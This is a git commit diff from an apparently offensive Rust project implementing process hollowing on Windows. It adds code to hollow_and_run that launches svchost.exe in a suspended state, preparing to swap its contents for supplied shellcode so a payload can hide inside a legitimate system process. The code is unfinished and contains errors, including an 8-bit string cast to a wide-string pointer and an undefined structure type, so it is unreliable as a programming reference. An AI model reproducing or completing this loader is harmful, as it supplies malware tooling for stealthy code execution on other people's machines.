3db79ef97bd107a4f38e373ba54f588a625f89b4
koins <koins@duck.com>
2022-01-18 18:55:17 -0800

    CreateProcessW compiles, on to ZwQueryInformation

--- process_hollowing/src/rco_process_hollowing_windows/mod.rs
+++ process_hollowing/src/rco_process_hollowing_windows/mod.rs
@@ -1,26 +1,16 @@
 extern crate windows;
+use std::{mem, ptr};
+use std::ffi::{CString, c_void};
+use windows::Win32::Foundation::PWSTR;
+use windows::Win32::Security::SECURITY_ATTRIBUTES;
 use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
-use windows::Win32::System::Threading::{CreateProcessW, NtQueryInformationProcess, PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION, ResumeThread, STARTUPINFOW};
-
-// CreateProcessW
-// WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw
-// RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.CreateProcessW.html
-
-// StartupInfoW
-// WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfow
-// RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.STARTUPINFOW.html
-
-// ProcessInformation
-// WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
-// RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.PROCESS_INFORMATION.html
+use windows::Win32::System::Threading::{CreateProcessW, CREATE_SUSPENDED, NtQueryInformationProcess, PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION, ResumeThread, STARTUPINFOW};
 
 // zwQueryInformation
 // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess
 // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.NtQueryInformationProcess.html
 
-// Process_Basic_Information
-// WINDOWS --> https://www.pinvoke.net/default.aspx/Structures/PROCESS_BASIC_INFORMATION.html
-// RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.PROCESS_BASIC_INFORMATION.html
+
 
 // ReadProcessMemory
 // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory
@@ -34,7 +24,41 @@ use windows::Win32::System::Threading::{CreateProcessW, NtQueryInformationProces
 // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread
 // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.ResumeThread.html
 
-
 pub fn hollow_and_run(shellcode: &[u8]) {
     println!("stub");
+    // Create empty StartupInfoW struct for use in CreateProcess
+    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfow
+    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.STARTUPINFOW.html
+    let startup_info: STARTUPINFOW = unsafe { mem::zeroed() };
+
+    // Create empty ProcessInformation struct for use in CreateProcess
+    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
+    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.PROCESS_INFORMATION.html
+    let mut process_information: PROCESS_INFORMATION = unsafe { mem::zeroed() };
+
+    // Use CreateProcessW to create a suspended process that will be hollowed out for the shellcode
+    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw
+    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.CreateProcessW.html
+    let lp_application_name: PWSTR = unsafe { mem::zeroed() };
+    let mut lp_command_line: PWSTR = unsafe { mem::zeroed() };
+    lp_command_line.0 = CString::new("C:\\Windows\\System32\\svchost.exe").unwrap().into_raw() as *mut u16;
+    let lp_process_attributes: SECURITY_ATTRIBUTES = unsafe { mem::zeroed() };
+    let lp_thread_attributes: SECURITY_ATTRIBUTES = unsafe { mem::zeroed() };
+    let lp_environment: c_void = unsafe { mem::zeroed() };
+    let lp_current_directory: PWSTR = unsafe { mem::zeroed() };
+    let creation_result = unsafe { CreateProcessW(lp_application_name,
+                                                  lp_command_line,
+                                                  &lp_process_attributes,
+                                                  &lp_thread_attributes,
+                                                  false,
+                                                  CREATE_SUSPENDED,
+                                                  &lp_environment,
+                                                  &lp_current_directory,
+                                                  &startup_info,
+                                                  &mut process_information) };
+
+    // Create empty Process_Basic_Information struct for use in ZwQueryInformationProcess
+    // WINDOWS --> https://www.pinvoke.net/default.aspx/Structures/PROCESS_BASIC_INFORMATION.html
+    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.PROCESS_BASIC_INFORMATION.html
+    let basic_information: Process_Basic_Information = unsafe { mem::zeroed() };
 }
